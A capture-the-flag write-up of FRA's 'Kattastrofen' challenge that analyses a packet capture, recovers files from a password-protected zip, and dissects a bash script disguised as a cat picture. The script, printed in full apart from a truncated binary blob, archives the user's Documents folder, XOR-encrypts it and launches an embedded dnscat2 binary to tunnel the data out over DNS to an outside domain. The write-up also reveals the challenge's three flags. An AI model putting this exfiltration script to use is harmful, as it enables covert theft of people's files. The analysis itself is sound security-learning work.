# FRA - Kattastrofen

Here is a writeup about FRA's challenge Kattastrofen. I solved it together with my sidekick **onind00**. The challenge can be found at [challenge.fra.se](https://challenge.fra.se)

## Introduction

The scenario was that a government employee at a classified agency was very weak for cat pictures. Their hunt for these pictures had caused them to accidentally download something that wasn't good, presumably malicious code, which exfiltrated top secret data. Our task was to analyze a pcap file to try to figure out what had happened.

## First Flag

We started by doing an overview analysis of the network traffic. Since the user had been hunting for cat pictures and downloaded such, we were extra attentive to all HTTP traffic. In Wireshark we took **File > Export Objects > HTTP...** and could then see the entire file structure for the website, including html, css, images and a zip file.

We opened the html file in the web browser to see what it looked like - then we saw a text where it said `password is 'hunter2'`. We extracted the zip file, and as we suspected, it was password protected. We entered `hunter2` and could extract the file. There we saw a bunch of jpg files and a text file called *flag*. We opened it and could read the first flag.

<details>
  <summary><b>Click to see the first flag</b></summary>

  `flagga1{klassiska_lösenord_för_100}`
</details> 

## Second Flag

The first flag had been very straight forward to find - we just did the natural steps. Finding the second flag would prove to be, let's say, somewhat harder...

We knew based on the plot that the person had downloaded images and then something had happened. It was therefore after the download of the zip file that data had been exfiltrated from the user's system. At a quick glance of the downloaded jpg files, there was one that stood out, `kitten-3.jpg`, which partly hadn't generated a thumbnail, and was significantly larger than the others. We suspected that it contained something important.

I ran `file kitten-3.jpg` and got the response that it was a bash script. Upon closer inspection of `kitten-3.jpg` in a text editor we could see the actual script. After analyzing the script, both manually and with the help of AI, we could conclude that it roughly did the following:

- When the user opened `kitten-3.jpg`, `kitten-9.jpg` was displayed instead and the process ran in the background.
- Collected everything that was in `/home/users/Documents/` and saved this to a tar file in `/tmp/exfil.tar`
- Wrote another file that contained metadata, including file size of the tar file, date of creation and the tar file's md5 hash. This was saved as `/tmp/exfil.dat`
- Converts and XOR-encrypts the tar file with the key specified at the beginning of the script.
- The output from the XOR function was then encoded to base64.

After the steps above, there was a step in the script that we didn't fully understand at our first analysis. Based on the traffic in the pcap file, we could conclude that this data had then been sent off to `cutekittenzz.xyz` over DNS port 53, something called DNS tunneling. About 94% of all packets in the pcap file used port 53, so it was quite obvious. Upon closer analysis of the script somewhat later, we could confirm it with certainty.

The script also contained a large blob in base64. It would turn out that this base64 hid binary code that was executed when the user opened `kitten-3.jpg`. The script namely did:

- Decoded the blob with base64 (which consisted of binary code) and wrote it to the file `mjau`.
- Made the file `mjau` executable through `chmod +x`
- Ran the file through `./mjau` and used `cutekittenzz.xyz` as an argument.
  
Upon closer look at what the binary code did, it was `dnscat2` that handled the actual transfer via DNS.

#### Here is the script

```bash
#!/bin/bash

D=$(dirname "$0")
eog "$D/kitten-9.jpg" &

key="P1yq59jxFvIGgyebMmzgQIx6f/ng0fmK+N5+kDdBcgU="
echo $key |base64 -d > /tmp/key
tar cf - $HOME/Documents > /tmp/exfil.tar
echo "EXFIL $(date)" > /tmp/exfil.dat
echo "SIZE: $(stat -c%s /tmp/exfil.tar)" >> /tmp/exfil.dat
md5sum /tmp/exfil.tar >> /tmp/exfil.dat
echo "BEGIN DATA" >> /tmp/exfil.dat
paste <(od -An -vtu1 -w1 /tmp/exfil.tar) <(while :; do od -An -vtu1 -w1 /tmp/key; done) \
  | LC_ALL=C awk 'NF!=2{exit}; {printf "%c", xor($1, $2)}' | base64 >> /tmp/exfil.dat
echo "END DATA" >> /tmp/exfil.dat

base64 -d > mjau << 'EOM'
f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAgCkAAAAAAABAAAAAAAAAACgrBQAAAAAAAAAAAEAAOAANAEAAJgAlAAYAAAAE
...
AAAAAAAAAAARAAAAAwAAAAAAAAAAAAAAAAAAAAAAAACwKQUAAAAAAHUBAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAA
EOM
chmod +x mjau
./mjau cutekittenzz.xyz
```

We could see all packets sent via DNS, but we had difficulty interpreting what they contained. Each packet had approximately the following format `e0d8012b173d8aec7a.cutekittenzz.xyz`. It would turn out that the string that functioned as a subdomain contained the actual data. Now it was up to us to reverse engineer the exfiltration process. This by:

- Understanding what format the data had when it was sent (suspect it was hex)
- Assembling the data from all packets in the right order.
- Decoding everything in the right steps to then be able to reverse the XOR encryption
- Getting a working tar file containing the data that was exfiltrated.

It would prove to be easier said than done. With the help of AI we got a bunch of different scripts to run to extract, clean up and convert the data in search of our file, but it constantly ended with us getting out files that were nowhere near resembling a tar file.

It ended with me giving the AI the entire pcap file, explaining the scenario, giving it the script from `kitten-3.jpg` and asking for an analysis and that I wanted it to extract and assemble the tar file.

I saw how the AI worked diligently and tested many of the methods that we ourselves had tried. Eventually the AI found the right method and delivered a fully working tar file.

I unpacked the tar file which indeed contained the folder structure for the user's home directory, and in `/home/user/Documents` was the file `topphemligt.pdf`. The top secret information was yet another cat picture with the second flag written in the middle of the picture. 

<details>
  <summary><b>Click to see the second flag</b></summary>
  
  `flagga2{every_day_is_caturday}`
</details>

## Third Flag

We knew from the task that there would be a total of three flags, so now it was time to find the last one. The first flag we had more or less gotten for free - we just had to do the natural steps and we got it. The second flag had as mentioned required quite a bit of work to find, so where could the third one be?

I had two theories - either that it could be found somewhere else in the network traffic, maybe that it had been sent with some protocol that there weren't many of. The second theory was that it was baked into the binary code that was in the script, what constituted `dnscat2`.

After skimming through the rest of the network traffic I realized quite quickly that there was nothing that stood out, most traffic besides the DNS packets was TCP traffic, but it was just regular packets representing the handshakes (three-way handshake) without any interesting data. Therefore I dove into the script. I got help from AI to make the code readable, but it turned out that it was only just `dnscat2`, nothing more of interest to find there.

That's when **onind00** cracked it, he had taken a closer look at the pdf file that contained the second flag. Before that I had only run **exiftool** on the pdf file, but it didn't contain any outstanding metadata, so I had moved on. I should have looked closer...

By running `strings topphemligt.pdf | less` we could see that the pdf file contained something exciting that usually isn't found in a regular pdf. There was a line that started with `javascript` followed by a long blob that seemingly looked like hex. What made me a bit puzzled though was that it was basically the same characters repeating over and over again

![PDF](img/pdf.png)

I decoded a small snippet of the hex string and realized that it was code written in **JSFuck** - an obscure variant of JS whose syntax only consists of six different characters. That's why there were so many repetitions!

I copied the hex blob and saved it to its own file, then ran the command `xxd -r -p hex.txt > jsfuck.txt` to decode the entire hex string. I then converted JSFuck to regular JS with the help of the site [https://enkhee-osiris.github.io/Decoder-JSFuck/](https://enkhee-osiris.github.io/Decoder-JSFuck/) and got the following:

```javascript
const data = [0n, 16777216n, 963362762567186450219276n, 1227815285621149424943362n, 4251180420234710034485506n, 1227908978741191150735617n, 1228942000327703451209986n, 1229089574843243084713986n, 1229089574913611821027586n, 1276163323341699551654156n, 1170935903267323904n, 16393102643729268736n]; 

if (0.1 + 0.2 == 0.3) {
  let str = "";
  for (let x of data) {
    str += x.toString(2).padStart(106, '0') + "\n";   
  }
  app.alert(str.replaceAll("0", " ").replaceAll("1", "."));
}
```

I could quickly determine that there wouldn't be any risk in running the code - what it basically did was:

- loop over an array that contained bigint numbers
- convert each bigint number to binary
- add each binary string to a new string in the variable `str` and end with a newline
- add padding so that all rows become equally long
- replace 0 with space
- replace 1 with period
- print the new string in an alert function

The tricky part was that everything was wrapped in an if-statement that seemingly looked to result in **true**, but upon closer inspection it results in **false** due to how JS handles floating points.

I rewrote the if-statement so that it instead said `if (true)` and changed `app.alert()` to `console.log()` and ran the code in the console in the web browser. What happened was that flag 3 was printed as ASCII art! This is how beautiful it turned out:

<details>
  <summary><b>Click to see the third flag</b></summary>
  
  ![Flagga 3](img/flag3.png)
</details><br>

No wonder it was hard to find flag 3 with grep...

## Final Words

A really fun challenge from FRA that really made me have to think and take the flag-hunting to the next level. I feel satisfied that we found flag 1 and 3 relatively easily, but I still wonder if/how we could have found flag 2 manually - the tar file was to say the least thoroughly hidden in the dns traffic.

I appreciate this type of challenge because I build on my knowledge in Wireshark, but also my knowledge to read and interpret code, something I can have good use of in my professional life (and future CTFs).

Thanks for reading, and happy hacking!

> 16 November 2025. Original text and markdown formatting by me. Translation by AI.